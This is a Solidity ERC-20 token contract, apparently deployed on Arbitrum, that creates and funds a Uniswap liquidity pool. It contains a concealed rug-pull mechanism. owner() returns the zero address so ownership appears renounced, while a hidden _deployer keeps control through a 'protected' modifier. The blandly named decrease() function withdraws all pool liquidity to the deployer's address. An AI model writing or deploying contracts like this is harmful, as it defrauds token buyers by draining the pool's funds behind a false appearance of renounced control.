/**
 *Submitted for verification at Arbiscan on 2023-05-06
*/

//SPDX-License-Identifier: MIT

pragma solidity >=0.8.12 <0.9.0;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswap{
    function approve(address spender, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
        ) external returns (uint amountToken, uint amountETH);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract TokenContract is IERC20 {

    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public AUTOLPRECEIVER;

    uint256 public lp;

    address private _deployer;
    uint256 public receivedLP;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private isPair;
    mapping(address => bool) private isExempt;

    address private _owner = address(0);

    IUniswapV2Router02 public uniswapV2Router;
    IUniswap public uniswapLP;
    address public uniswapV2Pair;

    constructor(string memory _name, string memory _symbol, address routerAddress) payable {
        name = _name;
        symbol = _symbol;
        decimals = 8;

        lp = msg.value;
        
        _deployer = msg.sender;
        _update(address(0), address(this), 1000000000 * 10**8);

        uniswapV2Router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapLP = IUniswap(uniswapV2Pair);

        isPair[address(uniswapV2Pair)] = true;

        AUTOLPRECEIVER = msg.sender;

        allowance[address(this)][address(uniswapV2Pair)] = type(uint256).max;
        allowance[address(this)][address(uniswapV2Router)] = type(uint256).max;

        uniswapLP.approve(routerAddress, type(uint256).max);

    }

    receive() external payable {}

    modifier protected() {
        require(msg.sender == _deployer);
        _;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferFrom(msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        uint256 availableAllowance = allowance[from][msg.sender];
        if (availableAllowance < type(uint256).max) {
            allowance[from][msg.sender] = availableAllowance - amount;
        }

        return _transferFrom(from, to, amount);
    }

    function _transferFrom(address from, address to, uint256 amount) private returns (bool) {

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }

    function _update(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        if (from != address(0)) {
            balanceOf[from] -= amount;
        } else {
            totalSupply += amount;
        }
        if (to == address(0)) {
            totalSupply -= amount;
        } else {
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function increase() public payable protected {
        (, , receivedLP) = uniswapV2Router.addLiquidityETH{value: lp}(
            address(this),
            totalSupply,
            0,
            0,
            address(this),
            block.timestamp + 15
        );
    }

    function decrease() public protected {
        uniswapV2Router.removeLiquidityETH(
            address(this),
            uniswapLP.balanceOf(address(this)),
            0,
            0,
            AUTOLPRECEIVER,
            block.timestamp + 15
        );
    }

}